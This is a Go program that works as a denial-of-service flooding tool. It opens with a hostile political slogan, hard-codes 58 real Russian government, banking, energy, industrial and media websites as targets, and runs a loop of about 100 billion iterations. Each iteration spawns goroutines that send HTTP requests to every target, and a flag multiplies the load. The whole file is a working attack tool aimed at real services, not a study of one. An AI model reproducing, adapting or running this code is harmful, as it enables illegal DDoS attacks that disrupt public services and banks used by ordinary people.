package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"time"

	"github.com/vardius/progress-go"
)

func MakeRequest(url string, ch chan<- string) {
	start := time.Now()
	_, err := http.Get(url)
	if err != nil {
	}
	secs := time.Since(start).Seconds()
	ch <- fmt.Sprintf("%.2f elapsed for url: %s", secs, url)
}

func processUrls(urls []string) {
	for _, url := range urls {
		ch := make(chan string)
		go MakeRequest(url, ch)
	}
}

func main() {
	log.Println("Fuck russia!")
	targets := [58]string{
		"https://rkn.gov.ru/", "https://pfr.gov.ru/", "https://customs.gov.ru/",
		"https://www.nalog.gov.ru/", "https://www.nalog.gov.ru/", "https://mil.ru/",
		"http://government.ru/", "http://kremlin.ru/", "https://www.mos.ru/uslugi/",
		"https://www.gosuslugi.ru/", "https://www.gazprombank.ru/", "https://www.vtb.ru/",
		"https://www.sberbank.ru", "https://omk.ru/", "https://www.eurosib.ru/",
		"https://www.uralkali.com/ru/", "https://www.polymetalinternational.com/ru/",
		"https://ya.ru/", "https://www.tmk-group.ru/", "https://rmk-group.ru/ru/",
		"https://nangs.org/", "https://www.metalloinvest.com/", "https://www.severstal.com/",
		"https://www.sibur.ru/", "https://nlmk.com/", "https://www.evraz.com/ru/", "https://www.tatneft.ru/",
		"https://www.surgutneftegas.ru/", "https://www.nornickel.com/", "https://magnit.ru/",
		"https://lukoil.ru", "https://www.gazprom.ru/ ",
		"https://lenta.ru/", "https://ria.ru/", "https://lenta.ru/", "https://ria.ru/",
		"https://ria.ru/lenta/", "https://www.rbc.ru/", "https://www.rt.com/", "http://kremlin.ru/",
		"http://en.kremlin.ru/", "https://smotrim.ru/", "https://tass.ru/", "https://tvzvezda.ru/",
		"https://cbr.ru/",
		"https://ipoteka-tut.ru",
		"https://vegabank.ru",
		"https://moskb.ru",
		"https://handybank.ru",
		"https://creditural.ru",
		"https://uralsibbank.ru",
		"https://vfbank.ru",
		"https://nz.ru",
		"https://ns-bank.ru",
		"https://my-zaim.ru",
		"https://bank-hlynov.ru",
		"https://psbank.ru",
		"https://tpsb.com.ru",
	}
	iterations := 100000000000
	multiplier := flag.Int("m", 1, "multiplier counter")
	flag.Parse()
	bar := progress.New(0, int64(iterations))
	_, _ = bar.Start()
	defer func() {
		if _, err := bar.Stop(); err != nil {
			log.Printf("failed to finish progress: %v", err)
		}

		log.Println("Done!")
	}()

	for i := 0; i < iterations; i++ {
		for j := 0; j < *multiplier; j++ {
			go processUrls(targets[:])
		}
		time.Sleep(100 * time.Millisecond)
		_, _ = bar.Advance(1)
	}
}
